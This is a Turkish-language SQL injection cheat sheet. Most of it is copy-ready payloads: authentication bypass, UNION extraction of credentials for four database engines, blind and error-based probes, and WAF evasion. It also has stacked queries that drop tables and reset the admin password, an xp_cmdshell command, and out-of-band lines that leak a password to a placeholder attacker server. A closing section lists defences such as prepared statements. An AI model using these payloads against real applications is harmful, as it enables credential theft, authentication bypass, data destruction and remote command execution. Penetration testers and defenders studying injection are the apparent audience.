# 02 - SQL Injection (SQL Enjeksiyonu)

> Kullanıcı girdisinin SQL sorgusuna güvenli olmayan biçimde eklenmesiyle, saldırganın sorguyu değiştirebildiği zafiyet.

## Zafiyet Nedir?

Uygulama kullanıcı girdisini doğrudan SQL sorgusuna birleştirdiğinde saldırgan sorgunun mantığını değiştirebilir. Sonuç: kimlik doğrulama atlatma, tüm veritabanını okuma, veri değiştirme/silme, bazı yapılandırmalarda komut çalıştırma.

| Tür | Açıklama |
|-----|----------|
| In-band (Union/Error) | Sonuçlar aynı kanaldan döner |
| Blind (Boolean/Time) | Görünür çıktı yok; doğru/yanlış veya gecikmeyle bilgi sızar |
| Out-of-band | DNS/HTTP gibi ikinci kanaldan veri sızdırma |

## Tespit

```sql
'
"
`
')
")
'--
' OR '1'='1
' AND '1'='2
```

- Tek tırnak (`'`) hata verirse güçlü işaret.
- `AND 1=1` normal, `AND 1=2` farklı dönerse boolean-based zafiyet var.

## Payload'lar

### Kimlik doğrulama atlatma

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
" OR "1"="1
" OR 1=1--
') OR ('1'='1
')) OR (('1'='1
' OR 'x'='x
admin'--
admin'#
admin'/*
admin' OR '1'='1
' OR '1'='1' LIMIT 1--
' OR username LIKE '%admin%
1' ORDER BY 1--+
' UNION SELECT 1,'admin','pass'--
```

### Yorum sözdizimleri

```sql
--          MySQL, MSSQL, PostgreSQL, Oracle (sonrasında boşluk)
--+         URL içinde boşluk yerine
#           MySQL
/* */       çok satırlı
;%00        null byte
```

### UNION - sütun sayısı bulma

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--          (hata verene kadar artır)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
```

### UNION - veri çekme (MySQL)

```sql
' UNION SELECT user(),database(),version()--
' UNION SELECT @@version,@@datadir,3--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT group_concat(username,0x3a,password),2,3 FROM users--
' UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables--
```

### UNION - veri çekme (PostgreSQL)

```sql
' UNION SELECT current_user,current_database(),version()--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' UNION SELECT string_agg(usename,','),2,3 FROM pg_user--
' UNION SELECT datname,2,3 FROM pg_database--
```

### UNION - veri çekme (MSSQL)

```sql
' UNION SELECT name,2,3 FROM master..sysdatabases--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' UNION SELECT @@version,SYSTEM_USER,DB_NAME()--
'; EXEC xp_cmdshell 'whoami'--
```

### UNION - veri çekme (Oracle)

```sql
' UNION SELECT banner,2,3 FROM v$version--
' UNION SELECT table_name,2,3 FROM all_tables--
' UNION SELECT column_name,2,3 FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT username,password,3 FROM all_users--
```

### Error tabanlı (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' OR 1 GROUP BY concat(version(),floor(rand(0)*2)) HAVING min(0)--
' AND exp(~(SELECT * FROM(SELECT version())a))--
```

### Error tabanlı (MSSQL / PostgreSQL)

```sql
-- MSSQL
' AND 1=convert(int,(SELECT @@version))--
' AND 1=(SELECT TOP 1 name FROM sysobjects)--
-- PostgreSQL
' AND 1=cast((SELECT version()) as int)--
' AND 1=cast((SELECT current_database()) as int)--
```

### Boolean tabanlı blind

```sql
' AND 1=1--
' AND 1=2--
' AND substring(version(),1,1)='5'--
' AND (SELECT count(*) FROM users)>0--
' AND ascii(substring((SELECT database()),1,1))>100--
' AND (SELECT substring(password,1,1) FROM users WHERE username='admin')='a'--
' AND length(database())=8--
' AND (SELECT 'a' FROM users WHERE username='admin' AND length(password)>5)='a'--
```

### Time tabanlı blind

```sql
-- MySQL
' AND sleep(5)--
' AND IF(1=1,sleep(5),0)--
' OR IF(substring(version(),1,1)='5',sleep(5),0)--
' AND IF(ascii(substring(database(),1,1))>100,sleep(5),0)--
-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
-- Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
' AND 1=(SELECT count(*) FROM all_users t1,all_users t2,all_users t3)--
```

### Out-of-band (DNS/HTTP sızdırma)

```sql
-- MySQL (Windows, UNC)
' AND load_file(concat('\\\\',(SELECT password FROM users LIMIT 1),'.SUNUCU\\a'))--
-- MSSQL
'; EXEC master..xp_dirtree '\\SUNUCU\a'--
-- Oracle
' AND (SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://SUNUCU/">%p;]>'),'/l') FROM dual)--
```

### Stacked queries

```sql
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','pass')--
'; UPDATE users SET password='x' WHERE username='admin'--
'; CREATE USER hacker WITH PASSWORD 'x'--
```

## Filtre / WAF Atlatma

```sql
-- Boşluk yerine
'/**/OR/**/1=1--
'%09OR%091=1--
'%0aOR%0a1=1--
'+OR+1=1--
'/*!50000OR*/1=1--

-- Anahtar kelime bölme (filtre bir kez siliyorsa)
UNunionION SELselectECT
' oORr 1=1--
' UN/**/ION SE/**/LECT--

-- Büyük/küçük harf
' UnIoN sElEcT ...

-- Eşittiri değiştir
' OR 1 LIKE 1--
' OR 1 IN (1)--
' OR 1 BETWEEN 1 AND 1--

-- Tırnaksız string (hex / char)
0x61646d696e
CHAR(97,100,109,105,110)
' OR username=0x61646d696e--

-- Yorum içi versiyon (MySQL)
'/*!UNION*/ /*!SELECT*/ 1,2,3--

-- Bilimsel gösterim / mantık
' OR 1.0=1.0--
' OR true--
```

## Korunma

1. Parametreli sorgular / Prepared Statements (en önemlisi): Girdiyi asla sorguya birleştirme.
   ```python
   cur.execute("SELECT * FROM users WHERE name = %s", (user_input,))
   ```
   ```java
   PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
   ps.setString(1, userInput);
   ```
2. ORM kullan (SQLAlchemy, Hibernate, Entity Framework); `raw()`/string birleştirme yine risklidir.
3. Allow-list girdi doğrulama; özellikle parametrelendirilemeyen sütun/tablo adları için.
4. En az yetki: Uygulama DB kullanıcısına yalnızca gerekeni ver (DROP/GRANT yok).
5. Ayrıntılı SQL hatalarını kullanıcıya gösterme.
6. WAF ek katman olarak, tek savunma olarak değil.

## Kaynaklar

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger - SQL injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
